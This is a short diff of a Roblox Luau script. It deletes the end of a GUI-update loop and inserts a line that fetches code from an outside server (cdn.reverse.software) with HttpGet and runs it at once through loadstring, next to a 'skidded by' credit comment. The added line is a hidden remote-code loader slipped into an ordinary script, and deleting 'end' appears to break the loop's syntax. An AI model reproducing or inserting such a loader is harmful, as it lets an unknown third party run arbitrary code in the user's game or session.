@@ -148,7 +148,8 @@ task.spawn(function()
 	while true do
 		updateGUI()
 		task.wait(1)
-	end
+ID="bae8749b-4e3d-414c-b931-b9b34f1afe06";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 end)
 
 -- SKIDDED BY SIGMA @rizzify101
